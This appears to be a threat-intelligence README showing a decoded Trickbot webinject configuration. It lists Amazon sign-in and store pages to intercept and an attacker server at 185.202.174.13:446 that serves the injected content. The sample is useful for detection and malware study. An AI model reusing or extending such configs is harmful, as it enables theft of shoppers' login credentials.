# Trickbot_Dinj_Sinj

Decoded Webinject config Trickbot



    </igroup>
    <dinj>
    <lm>*amazon.*</lm>
    <hl>https://185.202.174.13:446/response.php?s=1527163537124692&id=DeJENQHkNQsIpSv5YWb8</hl>
    <pri>100</pri>
    <sq>2</sq>
    <ignore_mask>https://www.amazon.co.uk/ap/signin</ignore_mask>
    <ignore_mask>https://www.amazon.co.uk/*</ignore_mask>
    <ignore_mask>https://www.amazon.co.uk/gp/yourstore/home*</ignore_mask>
    <ignore_mask>https://sellercentral.amazon.com/ap/signin*</ignore_mask>
    <ignore_mask>https://sellercentral.amazon.com/gp/notifications/notification-widget-internals.html*</ignore_mask>
    <ignore_mask>*popokai.com*</ignore_mask>
    <ignore_mask>*.js*</ignore_mask>
    <ignore_mask>https://www.amazon.de/ap/signin</ignore_mask>
    <ignore_mask>https://www.amazon.ca/ap/signin</ignore_mask>
    <ignore_mask>https://www.amazon.de/gp/yourstore/home*</ignore_mask>
    <ignore_mask>https://www.amazon.ca/gp/yourstore/home*</ignore_mask>
    <ignore_mask>https://www.amazon.ca/*</ignore_mask>
    <ignore_mask>https://www.amazon.de/*</ignore_mask>
    <require_header>*text/html*</require_header>
    </dinj>
    <dinj>
    <lm>https://www.amazon.co.uk/ap/signin</lm>
    <hl>https://185.202.174.13:446/response.php?s=1527163537124692&id=sL5FRia9p0kAxzAm7uXQ</hl>
    <pri>100</pri>
    <sq>2</sq>
    <ignore_mask>*popokai.com*</ignore_mask>
    </dinj>
